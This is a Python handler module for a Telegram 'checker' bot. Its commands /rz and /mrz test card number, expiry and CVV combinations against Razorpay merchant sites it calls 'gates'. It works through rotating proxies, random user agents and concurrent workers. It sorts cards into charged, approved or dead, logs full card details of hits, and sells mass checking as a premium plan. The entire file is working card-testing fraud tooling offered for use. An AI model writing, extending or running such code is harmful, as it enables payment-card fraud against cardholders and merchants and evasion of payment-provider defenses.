"""
handlers/checker.py — /rz (single check) and /mrz + /mrzstop (mass check)

Rules:
- In DMs: full card details exposed in responses (as requested)
- Group logs: CC numbers completely removed — BIN6 + network only
- /mrz is premium-only (up to MAX_MRZ_CARDS cards)
- A card is only "charged" when Razorpay confirms the payment_id
"""
import asyncio
import random
import time
from datetime import datetime
from io import BytesIO

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from config import (
    BATCH_DELAY, BATCH_SIZE, FORCE_AMOUNT, MASS_CONCURRENT,
    MAX_MRZ_CARDS, RK_SITES, RK_STATS, SEND_DELAY,
)
from core.bin_lookup import lookup_bin
from core.card_utils import mask_cc, net_display, parse_cc
from core.proxy_utils import get_live_proxies, pick_proxy
from core.razorpay_engine import check_card
from core.redis_client import redis
from core.site_utils import _gen_ua, get_live_sites, load_site_data
from utils.auth import has_plan, is_admin, is_banned, is_sudo
from utils.decorators import enforce_join, need_join
from utils.emojis import e, safe
from utils.helpers import log_hit, send_file
from utils.keyboards import kb_mrz_results
from utils.state import (
    active_mrz, mrz_results, progress_bar, spin,
)


# ─── /rz — Single CC Check ────────────────────────────────────────────────────

@need_join
async def cmd_rz(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = u.effective_user.id
    user = u.effective_user
    is_dm = u.effective_chat.type == "private"

    card_str = None
    if ctx.args:
        card_str = ctx.args[0]
    elif u.message.reply_to_message and u.message.reply_to_message.text:
        lines    = u.message.reply_to_message.text.strip().splitlines()
        card_str = lines[0].strip() if lines else None

    if not card_str:
        await u.message.reply_text(
            f"{e('card')} <b>Usage:</b>\n"
            f"  <code>/rz cc|mm|yy|cvv</code>\n"
            f"  Or reply to a card with <code>/rz</code>\n\n"
            f"  ex · <code>/rz 4111111111111111|12|26|123</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    parsed = parse_cc(card_str)
    if not parsed:
        await u.message.reply_text(
            f"{e('error')} Invalid format. Use: <code>cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    cc, mm, yy, cvv = parsed
    net  = net_display(cc)
    bin6 = cc[:6]

    # Card display: full in DMs, masked in groups
    cc_display = cc if is_dm else mask_cc(cc)

    sites_raw = await redis.lrange(RK_SITES, 0, -1)
    if not sites_raw:
        await u.message.reply_text(
            f"{e('error')} No gates loaded. Contact admin.",
            parse_mode=ParseMode.HTML,
        )
        return

    proxies = await get_live_proxies(auto_remove=True)
    px      = pick_proxy(proxies)

    msg = await u.message.reply_text(
        f"{spin(uid)} <b>Checking...</b>\n\n"
        f"{e('card')}  CC: <code>{cc_display}</code>\n"
        f"{e('bin')}   Net: {net}\n"
        f"{e('gate')}  Gate: <code>Razorpay</code>\n"
        f"{e('loading')} Running flow...",
        parse_mode=ParseMode.HTML,
    )

    UA        = _gen_ua()
    site_data = None
    for surl in random.sample(sites_raw, min(4, len(sites_raw))):
        sd = await load_site_data(surl, UA, px, auto_remove=True)
        if sd:
            site_data = sd
            break

    if not site_data:
        await msg.edit_text(
            f"{e('error')} All gates offline. Try again later.",
            parse_mode=ParseMode.HTML,
        )
        return

    t0      = time.monotonic()
    result  = await check_card(cc, mm, yy, cvv, site_data, px)
    elapsed = round(time.monotonic() - t0, 1)

    status   = result.get("status", "error")
    response = result.get("message", "")
    ts       = datetime.now().strftime("%H:%M:%S")
    binfo    = await lookup_bin(bin6)

    # Full card in DMs, masked in groups
    card_line_display = (
        f"{cc}|{mm}|{yy}|{cvv}" if is_dm
        else f"{mask_cc(cc)}|{mm}|{yy}|***"
    )

    if status == "charged":
        await msg.edit_text(
            f"{e('charged')} <b>CHARGED</b> — {safe(user.first_name)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{e('card')}  CC:   <code>{card_line_display}</code>\n"
            f"{e('bin')}   Net:  {net} · <b>{binfo['level']}</b>\n"
            f"{e('gate')}  Gate: <code>Razorpay</code>\n"
            f"{e('bolt')}  Resp: <b>{safe(response[:80])}</b>\n"
            f"{e('clock')} Time: <code>{elapsed}s</code> · {ts}",
            parse_mode=ParseMode.HTML,
        )
        await log_hit(ctx.bot, "CHARGED", f"{cc}|{mm}|{yy}|{cvv}", 1, user, response)
        await redis.hincrby(RK_STATS, "total_charged", 1)

    elif status == "approved":
        await msg.edit_text(
            f"{e('approved')} <b>APPROVED</b> — {safe(user.first_name)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{e('card')}  CC:   <code>{card_line_display}</code>\n"
            f"{e('bin')}   Net:  {net} · <b>{binfo['level']}</b>\n"
            f"{e('gate')}  Gate: <code>Razorpay</code>\n"
            f"{e('bolt')}  Resp: <b>{safe(response[:80])}</b>\n"
            f"{e('clock')} Time: <code>{elapsed}s</code> · {ts}",
            parse_mode=ParseMode.HTML,
        )
        await log_hit(ctx.bot, "APPROVED", f"{cc}|{mm}|{yy}|{cvv}", 1, user, response)
        await redis.hincrby(RK_STATS, "total_approved", 1)

    elif status == "declined":
        await msg.edit_text(
            f"{e('declined')} <b>DECLINED</b>\n"
            f"{e('card')}  CC: <code>{card_line_display}</code>\n"
            f"{e('bolt')}  {safe(response[:80])}\n"
            f"{e('clock')} {elapsed}s · {ts}",
            parse_mode=ParseMode.HTML,
        )
    else:
        await msg.edit_text(
            f"{e('error')} <b>Error</b>\n{safe(response[:80])}",
            parse_mode=ParseMode.HTML,
        )


# ─── /mrz — Mass Razorpay Check (Premium Only) ───────────────────────────────

@need_join
async def cmd_mrz(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = u.effective_user.id
    user = u.effective_user
    is_dm = u.effective_chat.type == "private"

    # Premium check
    if not is_admin(uid) and not await is_sudo(uid) and not await has_plan(uid):
        await u.message.reply_text(
            f"{e('lock')} <b>Premium Required</b>\n\n"
            f"{e('mass')} /mrz needs a premium plan\n"
            f"{e('plan')} Use /plans to see options\n"
            f"{e('key')} Use /redeem to activate",
            parse_mode=ParseMode.HTML,
        )
        return

    # Prevent double-run
    ev = active_mrz.get(uid)
    if ev and not ev.is_set():
        await u.message.reply_text(
            f"{e('error')} Mass check already running!\n"
            f"Use /mrzstop to stop it first.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Get file
    doc = None
    if u.message.document:
        doc = u.message.document
    elif u.message.reply_to_message and u.message.reply_to_message.document:
        doc = u.message.reply_to_message.document

    if not doc:
        await u.message.reply_text(
            f"{e('mass')} <b>Mass Razorpay Checker</b>\n\n"
            f"  cmd · <code>/mrz</code>\n"
            f"  txt · reply or attach .txt with /mrz\n\n"
            f"{e('star')} Max cards: <code>{MAX_MRZ_CARDS:,}</code>\n"
            f"{e('card')} Format: <code>cc|mm|yy|cvv</code> per line",
            parse_mode=ParseMode.HTML,
        )
        return

    if not (doc.file_name or "").lower().endswith(".txt"):
        await u.message.reply_text(
            f"{e('error')} Only .txt files supported.", parse_mode=ParseMode.HTML
        )
        return

    status_msg = await u.message.reply_text(
        f"{e('loading')} Downloading file...", parse_mode=ParseMode.HTML
    )

    try:
        buf = BytesIO()
        tgf = await doc.get_file()
        await tgf.download_to_memory(out=buf)
        buf.seek(0)
        try:
            content = buf.read().decode("utf-8")
        except Exception:
            buf.seek(0)
            content = buf.read().decode("utf-8", errors="replace")
    except Exception as ex:
        await status_msg.edit_text(
            f"{e('error')} Download failed: {safe(str(ex)[:60])}",
            parse_mode=ParseMode.HTML,
        )
        return

    raw_lines  = [l.strip() for l in content.splitlines() if l.strip()]
    cards_raw  = [l for l in raw_lines if parse_cc(l) is not None]
    skipped    = len(raw_lines) - len(cards_raw)
    total_all  = len(cards_raw)

    if not cards_raw:
        await status_msg.edit_text(
            f"{e('error')} No valid cards found.\nExpected: <code>cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    # Enforce limit
    if total_all > MAX_MRZ_CARDS:
        skipped   += total_all - MAX_MRZ_CARDS
        cards_raw  = cards_raw[:MAX_MRZ_CARDS]

    total = len(cards_raw)

    if skipped > 0:
        await u.message.reply_text(
            f"{e('folder')} <b>File Info</b>\n\n"
            f"  ► valid · {total:,}\n"
            f"  ► skipped · {skipped:,} (bad format or over limit)",
            parse_mode=ParseMode.HTML,
        )

    sites_raw = await redis.lrange(RK_SITES, 0, -1)
    if not sites_raw:
        await status_msg.edit_text(
            f"{e('error')} No gates loaded. Contact admin.",
            parse_mode=ParseMode.HTML,
        )
        return

    stop_ev = asyncio.Event()
    active_mrz[uid] = stop_ev
    mrz_results[uid] = {"charged": [], "approved": [], "dead": [], "errors": []}

    # Phase 1
    await status_msg.edit_text(
        f"{e('loading')} <b>Phase 1/3 — Checking Proxies...</b>\n\n"
        f"{e('proxy')} Scanning and removing dead proxies...",
        parse_mode=ParseMode.HTML,
    )
    live_pxs = await get_live_proxies(auto_remove=True)

    if stop_ev.is_set():
        await status_msg.edit_text(f"{e('stop')} Stopped.", parse_mode=ParseMode.HTML)
        active_mrz.pop(uid, None)
        return

    # Phase 2
    await status_msg.edit_text(
        f"{e('loading')} <b>Phase 2/3 — Loading Gates...</b>\n\n"
        f"{e('proxy')} Proxies: {e('check')} <code>{len(live_pxs)}</code> live\n"
        f"{e('lock')} Gates are confidential",
        parse_mode=ParseMode.HTML,
    )
    live_sites = await get_live_sites(live_pxs)

    if stop_ev.is_set():
        await status_msg.edit_text(f"{e('stop')} Stopped.", parse_mode=ParseMode.HTML)
        active_mrz.pop(uid, None)
        return

    if not live_sites:
        await status_msg.edit_text(
            f"{e('error')} No active gates. Contact admin.",
            parse_mode=ParseMode.HTML,
        )
        active_mrz.pop(uid, None)
        return

    start_time = time.time()
    checked = charged_ct = approved_ct = dead_ct = error_ct = 0
    last_edit = time.time()
    sem       = asyncio.Semaphore(MASS_CONCURRENT)
    result_q: asyncio.Queue = asyncio.Queue()
    site_idx = proxy_idx = 0

    def _bar() -> str:
        elapsed  = int(time.time() - start_time)
        rate     = (charged_ct + approved_ct) / max(checked, 1) * 100
        cps      = checked / max(elapsed, 1)
        eta_s    = int((total - checked) / max(cps, 0.1))
        bar      = progress_bar(checked, total)
        spn      = spin(uid)
        workers  = min(MASS_CONCURRENT, total - checked)
        queue    = total - checked
        return (
            f"{e('bolt')} <b>RAZORPAY MASS</b> — "
            f"{int(checked / total * 100) if total else 0}%\n\n"
            f"  ► workers · {workers}w · queue · {queue}\n"
            f"  <code>[{bar}]</code> <code>{checked:,} / {total:,}</code>\n\n"
            f"{e('stats')} <b>Hit Count</b> {spn}\n"
            f"  ► {e('charged')} Charged · <code>{charged_ct}</code>\n"
            f"  ► {e('approved')} Approved · <code>{approved_ct}</code>\n"
            f"  ► {e('dead')} DEAD · <code>{dead_ct}</code>\n"
            f"  ► {e('error')} Error · <code>{error_ct}</code>\n\n"
            f"  ► elapsed · <code>{elapsed // 60}m {elapsed % 60}s</code>\n"
            f"  ► hit rate · <code>{rate:.1f}%</code>\n"
            f"  ► eta · <code>{eta_s // 60}m {eta_s % 60}s</code>\n\n"
            f"{e('stop')} /mrzstop to stop"
        )

    async def _worker(card_line: str):
        nonlocal site_idx, proxy_idx
        async with sem:
            if stop_ev.is_set():
                await result_q.put({"status": "STOPPED", "card": card_line, "message": ""})
                return
            parsed = parse_cc(card_line)
            if not parsed:
                await result_q.put({"status": "error", "card": card_line, "message": "Parse error"})
                return
            cc_w, mm_w, yy_w, cvv_w = parsed
            site = live_sites[site_idx % len(live_sites)]
            px   = live_pxs[proxy_idx % len(live_pxs)] if live_pxs else None
            site_idx  += 1
            proxy_idx += 1
            res = await check_card(cc_w, mm_w, yy_w, cvv_w, site, px)
            res["card"] = card_line
            await result_q.put(res)

    tasks = [asyncio.create_task(_worker(c)) for c in cards_raw]

    for _ in range(total):
        if stop_ev.is_set():
            break
        res       = await result_q.get()
        checked  += 1
        status    = res.get("status", "error")
        response  = res.get("message", "")
        card_line = res.get("card", "")
        parsed    = parse_cc(card_line)

        if parsed:
            cc_r, mm_r, yy_r, cvv_r = parsed
            net_r     = net_display(cc_r)
            cc_mask   = mask_cc(cc_r)
            card_full = f"{cc_r}|{mm_r}|{yy_r}|{cvv_r}"
            # In DMs show full card, in groups mask
            card_display = card_full if is_dm else f"{cc_mask}|{mm_r}|{yy_r}|***"
        else:
            cc_r = ""; net_r = "⬛"; cc_mask = "????"; card_full = card_line
            card_display = card_line

        ts = datetime.now().strftime("%H:%M:%S")

        if status == "charged":
            charged_ct += 1
            mrz_results[uid]["charged"].append(card_full)
            await ctx.bot.send_message(
                u.effective_chat.id,
                f"{e('charged')} <b>CHARGED</b> · {net_r}\n"
                f"  {e('card')} <code>{card_display}</code>\n"
                f"  {e('bolt')} {safe(response[:70])}\n"
                f"  {e('clock')} {ts}",
                parse_mode=ParseMode.HTML,
            )
            await log_hit(ctx.bot, "CHARGED", card_full, 1, user, response)
            await redis.hincrby(RK_STATS, "total_charged", 1)
            await asyncio.sleep(0.3)

        elif status == "approved":
            approved_ct += 1
            mrz_results[uid]["approved"].append(card_full)
            await ctx.bot.send_message(
                u.effective_chat.id,
                f"{e('approved')} <b>APPROVED</b> · {net_r}\n"
                f"  {e('card')} <code>{card_display}</code>\n"
                f"  {e('bolt')} {safe(response[:70])}\n"
                f"  {e('clock')} {ts}",
                parse_mode=ParseMode.HTML,
            )
            await log_hit(ctx.bot, "APPROVED", card_full, 1, user, response)
            await redis.hincrby(RK_STATS, "total_approved", 1)
            await asyncio.sleep(0.3)

        elif status == "STOPPED":
            break
        elif status == "error":
            error_ct += 1
            mrz_results[uid]["errors"].append(card_line)
        else:
            dead_ct += 1
            mrz_results[uid]["dead"].append(card_line)

        # Update progress every 2.5s
        if time.time() - last_edit >= 2.5:
            try:
                await status_msg.edit_text(_bar(), parse_mode=ParseMode.HTML)
                last_edit = time.time()
            except Exception:
                pass

    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)
    active_mrz.pop(uid, None)

    elapsed  = int(time.time() - start_time)
    stopped  = stop_ev.is_set()
    rate     = (charged_ct + approved_ct) / max(checked, 1) * 100
    dl_kb    = kb_mrz_results(uid)

    await status_msg.edit_text(
        f"{e('check')} <b>{'STOPPED' if stopped else 'COMPLETE'}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('stats')} <b>Summary</b>\n"
        f"  ► cards · <code>{checked:,}</code>\n"
        f"  ► elapsed · <code>{elapsed // 60}m {elapsed % 60}s</code>\n"
        f"  ► hit rate · <code>{rate:.1f}%</code>\n\n"
        f"{e('stats')} <b>Hit Count</b>\n"
        f"  ► {e('charged')} Charged · <code>{charged_ct}</code>\n"
        f"  ► {e('approved')} Approved · <code>{approved_ct}</code>\n"
        f"  ► {e('dead')} DEAD · <code>{dead_ct}</code>\n"
        f"  ► {e('error')} Error · <code>{error_ct}</code>\n"
        f"  ► {e('eyes')} Skipped · <code>{skipped}</code>\n\n"
        f"  ► checked by · {e('user')} "
        f"<a href='tg://user?id={uid}'>{safe(user.first_name)}</a>",
        parse_mode=ParseMode.HTML,
        reply_markup=dl_kb,
    )


# ─── /mrzstop ─────────────────────────────────────────────────────────────────

@need_join
async def cmd_mrzstop(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    ev  = active_mrz.get(uid)
    if ev and not ev.is_set():
        ev.set()
        await u.message.reply_text(
            f"{e('stop')} Stop signal sent. Halting after current card.",
            parse_mode=ParseMode.HTML,
        )
    else:
        await u.message.reply_text(
            f"{e('info')} No active mass job.", parse_mode=ParseMode.HTML
        )
